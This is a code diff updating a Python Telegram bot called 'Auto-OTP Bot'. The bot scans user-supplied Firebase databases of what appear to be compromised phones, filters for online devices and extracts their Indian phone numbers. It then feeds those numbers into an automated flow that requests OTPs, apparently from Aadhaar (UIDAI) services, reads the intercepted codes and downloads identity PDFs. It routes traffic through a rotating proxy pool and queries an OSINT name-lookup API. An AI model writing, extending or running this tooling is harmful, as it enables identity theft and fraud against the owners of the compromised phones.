@@ -1,19 +1,33 @@
 """
 ╔══════════════════════════════════════════════════╗
-║          AUTO-OTP BOT v1.3                       ║
+║          AUTO-OTP BOT v1.4                       ║
 ║   Firebase → Auto Number → Auto OTP → PDF Drop   ║
 ║   + Proxy Pool (proxies.txt)                     ║
-║   + Device detection ported from goplay.py       ║
+║   + Detection ported from goplay.py (proven)     ║
 ╚══════════════════════════════════════════════════╝
+
+Commands:
+  /addfire URL:AUTH       - Add single Firebase DB
+  /addfire (bulk paste)   - Add multiple Firebase DBs (one per line)
+  /removefire URL         - Remove a Firebase DB
+  /removefire all         - Remove all Firebase DBs
+  /listfire               - List all added Firebase DBs with status
+  /scan                   - Scan all DBs and show online devices
+  /auto [count]           - Start auto-OTP for N numbers (default 5)
+  /stopauto               - Stop running auto-OTP
+  /resetused              - Reset used numbers list
+  /status                 - Show bot status
+  /help                   - Show commands
+
+proxies.txt format (one per line):
+  host:port:username:password
 """
 
 import requests
 from requests.exceptions import (
     ProxyError as ReqProxyError,
     ConnectTimeout as ReqConnectTimeout,
-    ReadTimeout as ReqReadTimeout,
     ConnectionError as ReqConnectionError,
-    Timeout as ReqTimeout,
 )
 import json
 import base64
@@ -40,7 +54,7 @@ BOT_NAME = "⚡ Auto-OTP Bot"
 DIVIDER = "━━━━━━━━━━━━━━━"
 NAME_API = "https://sarkariupdate.online/osint/APIX.php?api=num_api&q="
 
-# Detection debug logging
+# Verbose skip logging (turn off in production by setting to False)
 DEBUG_SKIP = True
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -403,13 +417,16 @@ def dl_pdf(eid, otp, otxn, tid):
         return False, str(e)
 
 # ============================================================
-# 🧠 DEVICE DETECTION — direct port from goplay.py (working)
+# 🧠 DEVICE DETECTION — exact port from goplay.py (proven)
 # ============================================================
+# goplay scans these keys anywhere in the node (case-insensitive substring)
 PHONE_TARGET_KEYS = ["phone", "phonenumber", "mobno", "mobile", "number", "num", "to"]
 
 def _extract_phones_from_node(node):
-    """Return set of valid +91XXXXXXXXXX phones found anywhere in this client node.
-    Exact scan from goplay.py."""
+    """
+    Return set of valid +91XXXXXXXXXX phones found in this client node.
+    EXACT logic from goplay.py get_client_stats().
+    """
     found = set()
     for k, v in node.items():
         if any(tk in k.lower() for tk in PHONE_TARGET_KEYS) and isinstance(v, (str, int)):
@@ -422,7 +439,7 @@ def _extract_phones_from_node(node):
     return found
 
 def _to_aad_format(phone_with_cc):
-    """goplay uses '+91XXXXXXXXXX'; aad.py's downstream needs bare 10 digits."""
+    """Convert '+91XXXXXXXXXX' → 'XXXXXXXXXX' (bare 10 digits, used by UIDAI APIs)."""
     d = re.sub(r'[^0-9]', '', str(phone_with_cc))
     return d[-10:] if len(d) >= 10 else None
 
@@ -436,10 +453,14 @@ def _fb_url(url, auth, path):
 
 def fb_scan():
     """
-    Exact port of goplay.py's get_client_stats() device-detection logic:
-      - active ⇔ status is True / 'true'
-      - phone extracted from any key containing phone/mobno/mobile/number/num/to
-      - skips anonymous message-only nodes
+    Scan every registered Firebase DB and return online devices.
+
+    This is a 1:1 port of goplay.py's get_client_stats():
+      1. active ⇔ status is True / 'true' / 1
+      2. skip anonymous '-xxx' nodes that have neither battery nor status
+      3. extract phone from any key containing phone/mobno/mobile/number/num/to
+      4. validate last 10 digits against ^[6-9]\\d{9}$
+      5. dedupe across the whole scan
     """
     devs = []
     seen_phones = set()
@@ -463,37 +484,59 @@ def fb_scan():
             data = r.json()
             if not data or not isinstance(data, dict):
                 if DEBUG_SKIP:
-                    logger.info(f"⚠️ {db['url']} → empty/non-dict")
+                    logger.info(f"⚠️ {db['url']} → empty or non-dict")
                 continue
 
             if DEBUG_SKIP:
                 logger.info(f"📦 {db['url']} → {len(data)} client node(s)")
 
-            for did, node in data.items():
+            total_count = 0
+            online_count = 0
+            offline_count = 0
+
+            for device_id, node in data.items():
                 if not isinstance(node, dict):
                     continue
 
-                # Exactly goplay.py's filter for anonymous message-only nodes
-                if (str(did).startswith("-")
-                        and len(str(did)) > 10
+                # ── goplay's anonymous node filter ──
+                if (str(device_id).startswith("-")
+                        and len(str(device_id)) > 10
                         and not node.get("battery")
                         and "status" not in node):
                     continue
 
+                total_count += 1
                 status_val = node.get("status")
-                is_active = (status_val is True or str(status_val).lower() == "true")
+                is_active = (status_val is True
+                             or str(status_val).lower() == "true"
+                             or status_val == 1)
+
                 if not is_active:
+                    offline_count += 1
                     if DEBUG_SKIP:
-                        logger.info(f"⚪ skip {did[:14]}… → status={status_val!r}")
+                        logger.info(f"⚪ skip {device_id[:14]}… → status={status_val!r}")
                     continue
 
-                phones = _extract_phones_from_node(node)
-                if not phones:
+                # ── extract phone(s) exactly like goplay ──
+                device_phones = set()
+                for k, v in node.items():
+                    if any(tk in k.lower() for tk in PHONE_TARGET_KEYS) and isinstance(v, (str, int)):
+                        val_str = str(v).strip()
+                        clean_digits = re.sub(r'[^0-9]', '', val_str)
+                        if len(clean_digits) >= 10:
+                            last_10 = clean_digits[-10:]
+                            if re.match(r'^[6-9]\d{9}$', last_10):
+                                device_phones.add("+91" + last_10)
+
+                if not device_phones:
+                    offline_count += 1
                     if DEBUG_SKIP:
-                        logger.info(f"⚪ skip {did[:14]}… → status=true but no phone key found")
+                        logger.info(f"⚪ skip {device_id[:14]}… → status=true but no phone key found")
                     continue
 
-                for p_cc in phones:
+                # ── add each phone (dedupe across scan) ──
+                added_for_this_device = False
+                for p_cc in device_phones:
                     aad_phone = _to_aad_format(p_cc)
                     if not aad_phone:
                         continue
@@ -505,16 +548,24 @@ def fb_scan():
                                 logger.info(f"⚪ skip {aad_phone} → already used")
                             continue
                     seen_phones.add(aad_phone)
-
+                    added_for_this_device = True
                     devs.append({
                         "db_url": db["url"],
                         "db_auth": db["auth"],
-                        "dev_id": did,
+                        "dev_id": device_id,
                         "phone": aad_phone,
                         "phone_display": p_cc,
                         "battery": str(node.get("battery", "?"))[:6],
-                        "reason": "status:true",
                     })
+
+                if added_for_this_device:
+                    online_count += 1
+                else:
+                    offline_count += 1
+
+            if DEBUG_SKIP:
+                logger.info(f"📊 {db['url']} → total={total_count} online={online_count} offline={offline_count}")
+
         except Exception as e:
             if s is not None and _is_proxy_error(e):
                 mark_bad_proxy(getattr(s, '_proxy_url', None))
@@ -522,7 +573,7 @@ def fb_scan():
             continue
 
     if DEBUG_SKIP:
-        logger.info(f"✅ fb_scan found {len(devs)} online device(s)")
+        logger.info(f"✅ fb_scan: {len(devs)} online device(s) found")
     return devs
 
 def fb_msgids(url, auth, did):
@@ -588,8 +639,7 @@ def auto_worker(cid, count):
                   f"◈  Proxies · {total_p}\n<i>◌  Scanning...</i>")
     devs = fb_scan()
     if not devs:
-        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗  No online devices.\n"
-                      f"<i>Detection: status:true + phone-key scan</i>")
+        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗  No online devices.")
         auto_running.pop(cid, None)
         return
 
@@ -795,7 +845,7 @@ def handle(cid, text):
     elif cmd == '/addfire':
         if len(parts) < 2:
             send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Usage:\n<code>/addfire URL:AUTH</code>\n\n"
-                          f"Or just URLs:\n<code>/addfire\nURL1\nURL2</code>")
+                          f"Or just URLs (auto-tests auth):\n<code>/addfire\nURL1\nURL2</code>")
             return
         raw = parts[1].strip()
         lines = [l.strip() for l in raw.split('\n') if l.strip()]
@@ -930,8 +980,7 @@ def handle(cid, text):
         send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>◌ Scanning...</i>")
         devs = fb_scan()
         if not devs:
-            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No online devices.\n"
-                          f"<i>Detection: status:true + phone-key scan</i>")
+            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No online devices.")
             return
         ls = [f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>📱 Online Devices</b>\n"]
         for i, d in enumerate(devs[:50], 1):
